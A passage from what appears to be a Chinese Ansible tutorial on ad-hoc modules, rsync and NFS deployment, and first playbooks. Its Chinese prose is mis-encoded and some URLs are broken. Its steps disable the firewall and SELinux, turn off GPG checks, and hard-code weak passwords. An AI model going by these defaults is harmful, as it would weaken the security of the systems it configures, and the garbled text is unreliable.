<pre><code class="hljs language-sh" lang="sh">https: ËŒ tengine.taobao.org/download/tengine-2.3.3.tar.gzä¸‹è½½åˆ°/app/toolsç›®å½•ä¸‹é¢
ansible all -m file -a <span class="hljs-string">'path=/app/tools/ state=directory'</span>
ansible all -m get_url -a<span class="hljs-string">'url="https: ËŒ tengine.taobao.org/download/tengine-2.3.3.tar.gz" dest=/app/tools/'</span>
</code></pre>
<h6 data-id="heading-41">cï¼‰yum_repositoryæ¨¡å—</h6>
<ul>
<li>ä¹¦å†™å¥½yumé…ç½®æ–‡ä»¶ï¼Œcopyåˆ†å‘è¿‡å»å³å¯ã€‚</li>
</ul>

































<table><thead><tr><th><strong>yum****æºæ¨¡å—</strong><br/><strong>yum_repository</strong></th><th/></tr></thead><tbody><tr><td><strong>name</strong></td><td>yumæºä¸­åå­— [epel]</td></tr><tr><td><strong>description</strong></td><td>yumæºçš„æ³¨é‡Šè¯´æ˜ å¯¹åº”çš„ æ˜¯nameçš„å†…å®¹</td></tr><tr><td><strong>baseurl</strong></td><td>yumæºä¸­ baseurl ä¸‹è½½åœ°å€</td></tr><tr><td><strong>enabled</strong></td><td>æ˜¯å¦å¯åŠ¨è¿™ä¸ªæº yes/no</td></tr><tr><td><strong>gpgcheck</strong></td><td>æ˜¯å¦å¯åŠ¨gpgcheckåŠŸèƒ½ no</td></tr><tr><td><strong>file</strong></td><td>æŒ‡å®šyumæºçš„æ–‡ä»¶ è‡ªåŠ¨æ·»åŠ .repo é»˜è®¤ä¸æ¨¡å—åå­—</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh">root@m01 ~]<span class="hljs-comment"># cat /etc/yum.repos.d/epel.repo</span>
[epel]
name=Extra Packages <span class="hljs-keyword">for</span> Enterprise Linux 7 - <span class="hljs-variable">$basearch</span>
baseurl=http: ËŒ mirrors.aliyun.com/epel/7/<span class="hljs-variable">$basearch</span>
failovermethod=priority
enabled=1
gpgcheck=0
gpgkey=file: Ë etc/pki/rpm-gpg/RPM-GPG-KEY-EPEL-7
</code></pre>
<pre><code class="hljs language-sh" lang="sh">-m yum_repository
-a <span class="hljs-string">'name=epel
description="Extra Packages for Enterprise Linux 7 -$basearch"
baseurl="http: ËŒ mirrors.aliyun.com/epel/7/$basearch"
enabled=yes
gpgcheck=no
</span></code></pre>
<h5 data-id="heading-42">5.4ç”¨æˆ·ç®¡ç†</h5>
<ul>
<li><strong>user ç”¨æˆ·ç®¡ç†</strong></li>
<li>group ç”¨æˆ·ç»„ç®¡ç†</li>
</ul>

































<table><thead><tr><th>useræ¨¡å—</th><th/></tr></thead><tbody><tr><td>name</td><td>ç”¨æˆ·å</td></tr><tr><td>uid</td><td>æŒ‡å®šuid</td></tr><tr><td>group</td><td>æŒ‡å®šç”¨æˆ·ç»„</td></tr><tr><td>shell</td><td>æŒ‡å®šå‘½ä»¤è§£é‡Šå™¨</td></tr><tr><td>create_home</td><td>æ˜¯å¦åˆ›å»ºå®¶ç›®å½•ï¼ˆyes/noï¼‰</td></tr><tr><td>state</td><td>present æ·»åŠ <br/>absent åˆ é™¤</td></tr></tbody></table>
<ul>
<li>åˆ›å»ºç”¨æˆ·</li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#åˆ›å»ºwww_ansç”¨æˆ· uid=2000çš„è™šæ‹Ÿç”¨æˆ·ï¼Œå…ˆæ£€æŸ¥æœ‰æ²¡æœ‰è¯¥ç”¨æˆ·</span>
ansible all -a <span class="hljs-string">'id www_ans'</span>
ansible all -m user -a <span class="hljs-string">'name=www_ans uid=2000 shell=/sbin/nologin create_home=no state=present'</span>
</code></pre>
<ul>
<li>æ‰¹é‡æ›´æ–°å¯†ç </li>
</ul>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#å®˜ç½‘æ–‡æ¡£ï¼Œç”Ÿæˆå¯†ç </span>
https://docs.ansible.com/ansible/latest/reference_appendices/faq.html<span class="hljs-comment">#how-do-i-generate-encrypted-passwords-for-the-user-module</span>

<span class="hljs-comment">#å®˜æ–¹ansibleç”Ÿæˆå¯†ç </span>
ansible all -i localhost, -m debug -a <span class="hljs-string">"msg={{ '12366' | password_hash('sha512', 'mysecretsalt') }}"</span>

ansible all -m user -a <span class="hljs-string">'name=liux_ans password="$6$mysecretsalt$47o4R/btNUBdeUe.eAV/RbdNcZM7vXgMW
GhLsStZuSbzojBIhSKbrVC0UIFr4CLfLmusW6qmtgQ4SMhAFbcEl/" state=present'</span>

<span class="hljs-comment">#è¿œç¨‹è®¾ç½®å¯†ç </span>
ansible all -m shell -a <span class="hljs-string">'echo 12366 |passwd --stdin liux_ans'</span>

</code></pre>
<h5 data-id="heading-43">5.5 ansible ad-hoc</h5>
<ul>
<li>ad-hocç®€è€Œè¨€ä¹‹å°±æ˜¯â€œä¸´æ—¶å‘½ä»¤â€ï¼Œæ‰§è¡Œå®Œå³ç»“æŸï¼Œå¹¶ä¸ä¼šä¿å­˜</li>
</ul>
<pre><code class="hljs language-sh" lang="sh">1.yumæ¨¡å—
yum:
  name: æŒ‡å®šè½¯ä»¶çš„åç§°
  state: çŠ¶æ€
      present: å®‰è£…è½¯ä»¶
      absent:  å¸è½½è½¯ä»¶
[root@ansible ~]<span class="hljs-comment">#ansible backup -m yum -a 'name=rsync state=present'</span>

2.copyæ¨¡å—
copy:
     src: æºæ–‡ä»¶
     dest: ç›®æ ‡ä½ç½®
     owner: å±ä¸»
     group: å±ç»„
     mode: æƒé™
     content: å°†contentåé¢çš„å­—ç¬¦ä¸²å†™å…¥åˆ°destç›®æ ‡æ–‡ä»¶ä¸­
     backup: <span class="hljs-built_in">yes</span>  å¤åˆ¶å‰å…ˆå°†destç›®æ ‡çš„æ–‡ä»¶è¿›è¡Œå¤‡ä»½
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a "src=1.txt dest=/root/ owner=ntp group=ntp mode=777 backup=yes"</span>
å°†å¯†ç æ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡ä½ç½®ä¸€å®šè¦å’Œé…ç½®æ–‡ä»¶ç›¸åŒ: /etc/rsync.passwd
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a 'content=rsync_backup:123456 dest=/etc/rsync.passwd mode=0600'</span>

3.group useræ¨¡å—
group:
	 name: ç»„çš„åç§°
	 gid:  ç»„<span class="hljs-built_in">id</span>
	 state: present å’Œ absent
user:
     name: ç”¨æˆ·åç§°
     uid: 666 æŒ‡å®šuidå·ç 
     group: www ä¸æŒ‡å®šæ•°å­— æŒ‡å®šç»„åç§°
     shell: /sbin/nologin  æˆ–è€… /bin/bash
     create_home: <span class="hljs-literal">false</span>  <span class="hljs-comment"># é»˜è®¤ä¸ºtrue åˆ›å»º falseä¸åˆ›å»º</span>
     state: present åˆ›å»º
     state: absent  åˆ é™¤
     
åˆ›å»ºç»„:
[root@ansible ~]<span class="hljs-comment"># ansible backup -m group -a 'name=www gid=666 state=present'</span>
åˆ›å»ºç”¨æˆ·:
[root@ansible ~]<span class="hljs-comment"># ansible backup -m user -a 'name=www uid=666 group=www shell=/sbin/nologin create_home=false state=present'</span>

4.fileæ¨¡å—
file:
	path: æ–‡ä»¶æˆ–ç›®å½•çš„è·¯å¾„
    state: <span class="hljs-built_in">touch</span>     åˆ›å»ºæ–‡ä»¶
           directory åˆ›å»ºç›®å½•
    	   <span class="hljs-built_in">link</span>      åˆ›å»ºè½¯é“¾æ¥
		   absent    åˆ é™¤
    owner:
 	group:
 	mode:

åˆ›å»ºç›®å½•å¹¶ä¿®æ”¹æƒé™
[root@ansible ~]<span class="hljs-comment"># ansible backup -m file -a 'path=/root/oldboy state=directory owner=www group=www recurse=yes'</span>

5.systemdæ¨¡å—
systemd:
       name: æœåŠ¡åç§°
       state:
       	     started:     å¯åŠ¨
       	     stopped:     åœæ­¢
       	     restarted:   é‡å¯
       	     reloaded:    é‡æ–°åŠ è½½
       	     enabled: <span class="hljs-built_in">yes</span> å¼€æœºè‡ªåŠ¨å¯åŠ¨
       	     enabled: no  å¼€æœºç¦æ­¢å¯åŠ¨
[root@ansible ~]<span class="hljs-comment"># ansible backup -m systemd -a 'name=rsyncd state=started enabled=yes'</span>

6.mountæŒ‚è½½æ¨¡å—
mount:
	 src: æºè®¾å¤‡
	 path: æŒ‚è½½åˆ°æœ¬åœ°çš„è·¯å¾„
	 fstype: nfs
	 state:
            absent	   <span class="hljs-comment"># å¸è½½å¹¶ä¸”åˆ é™¤/etc/fstabé…ç½® </span>
            mounted      <span class="hljs-comment"># æŒ‚è½½å¹¶ä¸”å†™å…¥åˆ°/etc/fstab</span>
            
 [root@ansible ~]<span class="hljs-comment"># ansible web01 -m mount -a 'src=172.16.1.31:/code/blog path=/mnt fstype=nfs state=mounted'</span>
 
 7.cronå®šæ—¶ä»»åŠ¡æ¨¡å—
cron:
	 minute: åˆ†é’Ÿ */5
	 job: å®šæ—¶ä»»åŠ¡å‘½ä»¤
	 state: present æ·»åŠ (ä¸å†™é»˜è®¤å°±æ˜¯åˆ›å»ºæˆ–è€…æ·»åŠ )
	 	    absent  åˆ é™¤

[root@ansible ~]<span class="hljs-comment"># ansible web01 -m cron -a 'name=ntpdate minute=*/5 job="ntpdate ntp1.aliyun.com &amp;&gt;/dev/null"'</span>

8.å…¶ä»–æ¨¡å—
01ï¼‰æ¨¡å—:commnd
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m  command -a 'ifconfig eth0'</span>
02ï¼‰scriptæ¨¡å—:
ansible web01 -m script -a  <span class="hljs-string">'/root/1.sh'</span>  <span class="hljs-comment"># 1.shåœ¨ansibleä¸»æœºä¸Š</span>
03ï¼‰get_urlæ¨¡å—: ä¸‹è½½è½¯ä»¶
get_url:
	   url: é“¾æ¥
	   dest: ä¸‹è½½åˆ°æœ¬åœ°çš„ä½ç½®
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m get_url -a 'url=https://img10.360buyimg.com/n1/g12/M00/08/03/rBEQYVGZ8F0IAAAAAAIapXb0bREAABlfAPtsn0AAhq9958.jpg dest=/root/'</span>

04ï¼‰firewalld åœæ­¢é˜²ç«å¢™
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m systemd -a 'name=firewalld state=stopped enabled=no'</span>

05ï¼‰selinux å…³é—­selinux
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m selinux -a 'policy=targeted state=disabled'</span>

06ï¼‰yum_repository: é…ç½®YUMä»“åº“æ¨¡å—
[root@ansible ~]<span class="hljs-comment"># ansible nfs -m yum_repository -a 'name=nginx description="Nginx YUM repo" baseurl=http://nginx.org/packages/centos/$releasever/$basearch/ enabled=yes gpgcheck=no gpgkey=https://nginx.org/keys/nginx_signing.key'</span>

07ï¼‰shellæ¨¡å—
[root@ansible ~]<span class="hljs-comment"># ansible web01 -m shell -a 'ps axu|grep nginx'</span>
</code></pre>
<h5 data-id="heading-44">5.6 ad-hocéƒ¨ç½²rsync</h5>
<pre><code class="hljs language-sh" lang="sh">----------------------------------------------
å†™å‡ºrsyncæ‰‹åŠ¨éƒ¨ç½²çš„æ­¥éª¤
1)å®‰è£…rsyncæœåŠ¡
yum -y install rsync
2)é…ç½®rsyncæœåŠ¡ æå‰å°†é…ç½®æ–‡ä»¶æ”¶é›†åˆ°ansibleç®¡ç†ä¸»æœº
[root@ansible ~]<span class="hljs-comment"># scp 10.0.0.41:/etc/rsyncd.conf .</span>
3)æ ¹æ®é…ç½®åˆ›å»ºå¿…è¦æ•°æ®
åˆ›å»ºwwwç”¨æˆ·
åˆ›å»ºå¯†ç æ–‡ä»¶/etc/rsync.passwd
å¯†ç æƒé™600

åˆ›å»ºç›®å½•
/backup
ä¿®æ”¹ç›®å½•æƒé™å±ä¸»å±ç»„www

4)å¯åŠ¨rsyncæœåŠ¡
systemctl start rsyncd
systemctl <span class="hljs-built_in">enable</span> rsyncd
-----------------------------------------------
1.é…ç½®å…å¯†ç ç™»å½•
[root@ansible ~]<span class="hljs-comment"># ssh-copy-id -i .ssh/id_rsa.pub 10.0.0.41</span>
2.é…ç½®ä¸»æœºæ¸…å•
root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts</span>
[nfs]
10.0.0.31
[webs]
web01 ansible_ssh_host=10.0.0.7 
web02 ansible_ssh_host=10.0.0.8
[backups]
backup ansible_ssh_host=10.0.0.41

3.é€šè¿‡ansibleå•æ¡å‘½ä»¤å®ç°è¿œç¨‹éƒ¨ç½²rsyncæœåŠ¡
01ï¼‰å®‰è£…rsync
[root@ansible ~]<span class="hljs-comment"># ansible backup -m yum -a 'name=rsync state=present'</span>
02ï¼‰é…ç½®rsync
å°†rsyncé…ç½®æ–‡ä»¶æ‹·è´åˆ°ç›®æ ‡ä½ç½®/etc/rsyncd.conf
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a 'src=rsyncd.conf dest=/etc/rsyncd.conf'</span>
03ï¼‰æ ¹æ®é…ç½®æ–‡ä»¶åˆ›å»ºå¿…è¦æ•°æ®
  a.åˆ›å»ºç»„
[root@ansible ~]<span class="hljs-comment"># ansible backup -m group -a 'name=www gid=666 state=present'  </span>
  b.åˆ›å»ºç”¨æˆ·
[root@ansible ~]<span class="hljs-comment"># ansible backup -m user -a 'name=www uid=666 group=www shell=/sbin/nologin create_home=false state=present'</span>
  c.å°†å¯†ç æ–‡ä»¶å†™å…¥åˆ°ç›®æ ‡ä½ç½®ä¸€å®šè¦å’Œé…ç½®æ–‡ä»¶ç›¸åŒ: /etc/rsync.passwd
[root@ansible ~]<span class="hljs-comment"># ansible backup -m copy -a 'content=rsync_backup:12366 dest=/etc/rsync.passwd mode=0600'</span>
  d.åˆ›å»º/backupå¹¶ä¿®æ”¹å±ä¸»å±ç»„
[root@ansible ~]<span class="hljs-comment"># ansible backup -m file -a 'path=/backup state=directory owner=www group=www'</span>

4)å¯åŠ¨æœåŠ¡
[root@ansible ~]<span class="hljs-comment"># ansible backup -m systemd -a 'name=rsyncd state=started enabled=yes'</span>
</code></pre>
<h5 data-id="heading-45">5.7 ad-hocéƒ¨ç½²nfs</h5>
<pre><code class="hljs language-sh" lang="sh">------------------------------------------------
1.å®‰è£…nfs
yum -y install nfs-utils
2.é…ç½®nfs
vim /etc/exports
/code/blog  172.16.1.0/24(rw,<span class="hljs-built_in">sync</span>,all_squash,anonuid=666,anongid=666)
3.æ ¹æ®é…ç½®æ–‡ä»¶åˆ›å»ºå¿…è¦æ•°æ®
<span class="hljs-built_in">mkdir</span> -p /code/blog
åˆ›å»ºwwwç»„å’Œç”¨æˆ·
æˆæƒ/code/blog
4.å¯åŠ¨nfs
------------------------------------------------
ansibleéƒ¨ç½²NFS
1.å¯†é’¥ä¸‹å‘
ssh-copy-id -i /root/.ssh/id_rsa.pub 10.0.0.31
2.å†™å…¥ä¸»æœºæ¸…å•
[root@ansible ~]<span class="hljs-comment"># cat /etc/ansible/hosts </span>
[nfs]
10.0.0.31
3.å®‰è£…nfs
ansible nfs -m yum -a <span class="hljs-string">'name=nfs-utils state=present'</span>
4.æ‹·è´é…ç½®æ–‡ä»¶åˆ°/etc/exports
éœ€æå‰æ‹·è´ä¸€ä»½å†™å¥½çš„æ–‡ä»¶  scp 10.0.0.31:/etc/exports .
ansible nfs -m copy -a <span class="hljs-string">'src=exports dest=/etc/exports
5.æ ¹æ®é…ç½®åˆ›å»ºæ•°æ®
ansible nfs -m group -a '</span>name=www gid=666<span class="hljs-string">'
ansible nfs -m user -a '</span>name=www group=www uid=666 shell=/sbin/nologin create_home=<span class="hljs-literal">false</span><span class="hljs-string">'
ansible nfs -m file -a '</span>path=/code/blog/ state=directory owner=www group=www<span class="hljs-string">'

6.å¯åŠ¨nfs
ansible nfs -m systemd -a '</span>name=nfs state=started enabled=<span class="hljs-built_in">yes</span><span class="hljs-string">'

7.æŒ‚è½½nfs
[root@m01 ~]# ansible web01 -m mount -a '</span>src=172.16.1.31:/code/blog path=/mnt fstype=nfs state=mounted<span class="hljs-string">'
</span></code></pre>
<h5 data-id="heading-46">5.8 setupæ¨¡å—</h5>
<pre><code class="hljs language-sh" lang="sh">1.æŸ¥çœ‹ä¸»æœºæ‰€æœ‰è¯¦ç»†ä¿¡æ¯
ansible web01 -m setup
2.è·å–ipåœ°å€
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_default_ipv4'</span>
3.è·å–ä¸»æœºå
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_fqdn'</span>
4.è·å–å†…å­˜ä¿¡æ¯
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_memory_mb'</span>
5.è·å–ç£ç›˜ä¿¡æ¯
ansible web01 -m setup -a <span class="hljs-string">'filter=ansible_devices'</span>


6.å…¶ä»–å‚æ•°ä¿¡æ¯
ansible_all_ipv4_addressesï¼šä»…æ˜¾ç¤ºipv4çš„ä¿¡æ¯ã€‚
ansible_devicesï¼šä»…æ˜¾ç¤ºç£ç›˜è®¾å¤‡ä¿¡æ¯ã€‚
ansible_distributionï¼šæ˜¾ç¤ºæ˜¯ä»€ä¹ˆç³»ç»Ÿï¼Œä¾‹ï¼šcentos,suseç­‰ã€‚
ansible_distribution_major_versionï¼šæ˜¾ç¤ºæ˜¯ç³»ç»Ÿä¸»ç‰ˆæœ¬ã€‚
ansible_distribution_versionï¼šä»…æ˜¾ç¤ºç³»ç»Ÿç‰ˆæœ¬ã€‚
ansible_machineï¼šæ˜¾ç¤ºç³»ç»Ÿç±»å‹ï¼Œä¾‹ï¼š32ä½ï¼Œè¿˜æ˜¯64ä½ã€‚
ansible_eth0ï¼šä»…æ˜¾ç¤ºeth0çš„ä¿¡æ¯ã€‚
ansible_hostnameï¼šä»…æ˜¾ç¤ºä¸»æœºåã€‚
ansible_kernelï¼šä»…æ˜¾ç¤ºå†…æ ¸ç‰ˆæœ¬ã€‚
ansible_lvmï¼šæ˜¾ç¤ºlvmç›¸å…³ä¿¡æ¯ã€‚
ansible_memtotal_mbï¼šæ˜¾ç¤ºç³»ç»Ÿæ€»å†…å­˜ã€‚
ansible_memfree_mbï¼šæ˜¾ç¤ºå¯ç”¨ç³»ç»Ÿå†…å­˜ã€‚
ansible_memory_mbï¼šè¯¦ç»†æ˜¾ç¤ºå†…å­˜æƒ…å†µã€‚
ansible_swaptotal_mbï¼šæ˜¾ç¤ºæ€»çš„swapå†…å­˜ã€‚
ansible_swapfree_mbï¼šæ˜¾ç¤ºswapå†…å­˜çš„å¯ç”¨å†…å­˜ã€‚
ansible_mountsï¼šæ˜¾ç¤ºç³»ç»Ÿç£ç›˜æŒ‚è½½æƒ…å†µã€‚
ansible_processorï¼šæ˜¾ç¤ºcpuä¸ªæ•°(å…·ä½“æ˜¾ç¤ºæ¯ä¸ªcpuçš„å‹å·)ã€‚
ansible_processor_vcpusï¼šæ˜¾ç¤ºcpuä¸ªæ•°(åªæ˜¾ç¤ºæ€»çš„ä¸ªæ•°)
</code></pre>
<h4 data-id="heading-47">6.Ansible-å‰§æœ¬ä¸å˜é‡ï¼ˆPlayBookï¼‰</h4>
<blockquote>
<p><code>PlayBook</code>å³â€å‰§æœ¬â€ï¼Œâ€å…µä¹¦â€ä¹‹æ„ï¼ŒPlayBookæ˜¯ç”±ä»¥ä¸‹éƒ¨åˆ†ç»„æˆçš„</p>
<p><code>play</code>: å®šä¹‰çš„æ˜¯ä¸»æœºçš„è§’è‰²ã€‚ï¼ˆä¸»è§’è¿˜æ˜¯é…è§’,æ‰¾å“ªä¸ªæ˜æ˜Ÿï¼‰
<code>task</code>: å®šä¹‰çš„æ˜¯å…·ä½“æ‰§è¡Œçš„ä»»åŠ¡ã€‚ï¼ˆè§’è‰²çš„å°è¯å’ŒåŠ¨ä½œï¼‰
<code>playbook</code>: ç”±ä¸€ä¸ªæˆ–å¤šä¸ªplayï¼ˆè§’è‰²ï¼‰ç»„æˆï¼Œä¸€ä¸ªplayï¼ˆè§’è‰²ï¼‰å¯ä»¥åŒ…å«å¤šä¸ªtaskï¼ˆå°è¯ï¼ŒåŠ¨ä½œï¼Œå¤§è…•æ¯é›†æ‹ä»€ä¹ˆï¼‰</p>
</blockquote>
<h5 data-id="heading-48">6.1æ¨¡å—</h5>
<h6 data-id="heading-49">01 mountæ¨¡å—</h6>
<ul>
<li>å®ç°mountå‘½ä»¤è¿›è¡ŒæŒ‚è½½ï¼Œå¯ä»¥ä¿®æ”¹/etc/fstabå®ç°æ°¸ä¹…æŒ‚è½½</li>
</ul>

























<table><thead><tr><th>mountæ¨¡å—</th><th/></tr></thead><tbody><tr><td>fstype</td><td>æŒ‡å®šæ–‡ä»¶ç³»ç»Ÿï¼šxfsã€ext4ï¼Œiso9660ï¼Œnfs</td></tr><tr><td>src</td><td>æºåœ°å€ï¼ˆnfsåœ°å€  172.16.1.31/dataï¼‰</td></tr><tr><td>path</td><td>æŒ‚è½½ç‚¹</td></tr><tr><td>==state==</td><td>==absent== å¸è½½å¹¶ä¿®æ”¹fstabæ–‡ä»¶ <br/>==mounted== æŒ‚è½½å¹¶ä¿®æ”¹fstab æ–‡ä»¶<br/>umounted å¸è½½ä¸ä¿®æ”¹fstabæ–‡ä»¶<br/>present ä»…ä¿®æ”¹/etc/fstab ä¸æŒ‚è½½<br/>remounted é‡æ–°æŒ‚è½½</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#é€šè¿‡ansibleç®¡ç†ï¼Œåœ¨web01ä¸ŠæŒ‚è½½nfsï¼š/dataæŒ‚è½½åˆ°web01çš„/ans-upload/</span>
<span class="hljs-comment">#1.nfs    æœåŠ¡ç«¯é…ç½®ï¼Œç›®å½•</span>
[root@nfs01 ~]<span class="hljs-comment"># showmount -e 172.16.1.31</span>
Export list <span class="hljs-keyword">for</span> 172.16.1.31:
/nfsdata 172.16.1.0/24
/data    172.16.1.0/24

<span class="hljs-comment">#2.web01  æ˜¯å¦å®‰è£…nfs</span>
[root@web01 ~]<span class="hljs-comment"># rpm -qa |grep nfs</span>
libnfsidmap-0.25-19.el7.x86_64
nfs-utils-1.3.0-0.68.el7.2.x86_64

<span class="hljs-comment">#3.web01  æŒ‚è½½</span>
ansible 172.16.1.7 -m mount -a <span class="hljs-string">'src=172.16.1.31:/data/ path=/ans-upload/ state=mounted fstype=nfs'</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/705446fa160e4ba9a5d18e21fae13a77~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=DuC1SmkFyJryqLBrlBqk3XRztGo%3D" alt="image-20230328151958108" loading="lazy"/></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/379709b9813e4a068acd2e7c847cc493~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=gvnopVQyHHHYKIisH2jEK490Cxc%3D" alt="image-20230328152339065" loading="lazy"/></p>
<h6 data-id="heading-50">02 cron æ¨¡å—</h6>
<ul>
<li>ç”¨äºç®¡ç†ç³»ç»Ÿçš„å®šæ—¶ä»»åŠ¡</li>
</ul>









































<table><thead><tr><th>cron æ¨¡å— å®šæ—¶ä»»åŠ¡</th><th/></tr></thead><tbody><tr><td>name</td><td>å®šæ—¶ä»»åŠ¡åç§°ï¼Œå¯¹åº”ä¸‹é¢æ³¨é‡Šçš„å†…å®¹</td></tr><tr><td>minute</td><td>åˆ†é’Ÿ</td></tr><tr><td>hour</td><td>å°æ—¶</td></tr><tr><td>day</td><td>å¤©</td></tr><tr><td>month</td><td>æœˆ</td></tr><tr><td>week</td><td>å‘¨</td></tr><tr><td>job</td><td>æŒ‡å®šå‘½ä»¤æˆ–è„šæœ¬ï¼ˆå®šå‘åˆ°ç©ºï¼‰job="/sbin/nptdate   nt1aliyun.com &amp;&gt;/dev/null"</td></tr><tr><td>state</td><td>present æ·»åŠ å®šæ—¶ä»»åŠ¡ï¼ˆé»˜è®¤ï¼‰<br/>absentåˆ é™¤</td></tr></tbody></table>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#2. sync time liux</span>
2 * * * * /sbin/ntpdate ntp1.aliyun.com &amp;&gt;/dev/null
</code></pre>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#æ‰¹é‡åˆ›å»ºå®šæ—¶ä»»åŠ¡</span>
ansible all -m cron -a <span class="hljs-string">'name="2. sync time liux" minute="*/5" job="/sbin/ntpdate ntp1.aliyun.com &amp;&gt;/devnull" state=present '</span>

<span class="hljs-comment">#æŸ¥çœ‹</span>
ansible all -a <span class="hljs-string">'crontab -l'</span>

<span class="hljs-comment">#æ‰¹é‡åˆ é™¤å®šæ—¶ä»»åŠ¡ï¼Œé€šè¿‡nameåˆ é™¤</span>
ansible all -m cron -a <span class="hljs-string">'name="2. sync time liux" state=absent'</span>
</code></pre>
<h5 data-id="heading-51">6.2 å‰§æœ¬</h5>
<ul>
<li>å‰§æœ¬:playbook ç”¨äºé•¿ä¹…ä¿å­˜å¹¶ä¸”å®ç°æ‰¹é‡ç®¡ç†ï¼Œç»´æŠ¤ï¼Œéƒ¨ç½²çš„æ–‡ä»¶</li>
<li>å‰§æœ¬yamlæ ¼å¼ï¼Œyamlæ ¼å¼çš„æ–‡ä»¶.ç©ºæ ¼ï¼Œå†’å·</li>
</ul>



































<table><thead><tr><th/><th>anså‰§æœ¬</th><th>ans ad-hoc</th></tr></thead><tbody><tr><td>å…±åŒç‚¹</td><td>æ‰¹é‡ç®¡ç†ï¼Œä½¿ç”¨æ¨¡å—</td><td>æ‰¹é‡ç®¡ç†ï¼Œä½¿ç”¨æ¨¡å—</td></tr><tr><td>ä¸åŒç‚¹</td><td>é‡å¤è°ƒç”¨</td><td>ä¸æ˜¯å¾ˆæ–¹ä¾¿ï¼Œä¸å®¹æ˜“é‡å¤</td></tr><tr><td>åº”ç”¨å»ºè®®ï¼ˆåº”ç”¨åœºæ™¯ ï¼‰</td><td>éƒ¨ç½²æœåŠ¡ï¼Œå¤šä¸ªæ­¥éª¤çš„æœåŠ¡</td><td>æµ‹è¯•æ¨¡å—ï¼Œä¸´æ—¶æ€§ä»»åŠ¡</td></tr><tr><td/><td/><td/></tr><tr><td/><td/><td/></tr></tbody></table>
<ul>
<li>å‰§æœ¬ä¹¦å†™æ ¼å¼</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/43a51b6c5dbd42b18c9a2e7f0411b8bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=wPiDSqdn6eNmySTcEaTiHsprtjE%3D" alt="image-20230328160616874" loading="lazy"/></p>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#1. ä¹¦å†™å‰§æœ¬ æ³¨æ„ä»¥.ymlæˆ–.yamlç»“å°¾</span>

<span class="hljs-comment">#2. æ‰§è¡Œå‰§æœ¬</span>
ansible-playbook 01.show.yml
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/700e9ca333164084a6c5ef1c72c2448c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbGl1eDM1Mjg=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768877500&amp;x-signature=fcvTmyZe%2BoRjK2KGvkOLZ6IRXhc%3D" alt="image-20230328160816391" loading="lazy"/></p>
<blockquote>
<p>æ‰§è¡Œçš„æ—¶å€™æœ‰å¥¶ç‰›:
å¯ä»¥åˆ é™¤è½¯ä»¶æˆ–ä¿®æ”¹ansible.cfgé…ç½®è¿›è¡Œå…³é—­ #nocows = 1å»æ‰æ³¨é‡Šå³å¯</p>
<p>å…·ä½“ä¹¦å†™æ³¨æ„äº‹é¡¹:
åŒä¸€ä¸ªå±‚çº§çš„å†…å®¹å¯¹é½çš„.
ä¸åŒå±‚çº§çš„é€šè¿‡2ä¸ªç©ºæ ¼å¯¹é½
ä¸èƒ½ä½¿ç”¨tabé”®</p>
</blockquote>
<h5 data-id="heading-52">6.3å‰§æœ¬æ¡ˆä¾‹</h5>
<h6 data-id="heading-53">01 åˆ›å»ºç›®å½•å¹¶åˆ†å‘æ–‡ä»¶</h6>
<blockquote>
<p>1.åˆ›å»ºç›®å½•/server/files</p>
<p>2.å°†/etc/hostsæ–‡ä»¶åˆ†å‘è¿‡å» /server/files</p>
</blockquote>
<pre><code class="hljs language-sh" lang="sh"><span class="hljs-comment">#1.åˆ›å»º</span>
-m file  -a <span class="hljs-string">'path=/server/files state=directory'</span>
<span class="hljs-comment">#2.åˆ†å‘</span>
-m copy  -a <span class="hljs-string">'src=/etc/hosts dest=/server/files'</span>
</code></pre>
<ul>
<li>ç¼–è¾‘å‰§æœ¬ vim /server/scripts/playbook/02.dist_file.yml</li>
</ul>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">hosts:</span> <span class="hljs-string">all</span>
  <span class="hljs-attr">tasks:</span> 
    <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-number">01</span> <span class="hljs-string">åˆ›å»ºç›®å½•</span>
      <span class="hljs-attr">file:</span> 
        <span class="hljs-attr">path:</span> <span class="hljs-string">/server/files</span> 
        <span class="hljs-attr">state:</span> <span class="hljs-string">directory</span>

